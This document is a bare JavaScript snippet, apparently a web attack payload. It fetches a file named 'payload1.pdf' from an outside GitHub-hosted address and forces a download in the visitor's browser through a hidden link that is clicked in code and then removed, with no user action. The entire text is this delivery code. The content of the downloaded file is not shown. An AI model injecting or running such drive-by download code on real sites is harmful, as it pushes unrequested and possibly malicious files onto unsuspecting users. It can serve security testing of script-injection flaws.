fetch("https://raw.githubusercontent.com/ener1-s3c/ener1-s3c.github.io/master/payload1.pdf")
  .then(response => response.blob())
  .then(blob => {
    var link = document.createElement("a");
    link.href = window.URL.createObjectURL(blob);
    link.download = "payload1.pdf";
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
  })
  .catch(console.error);
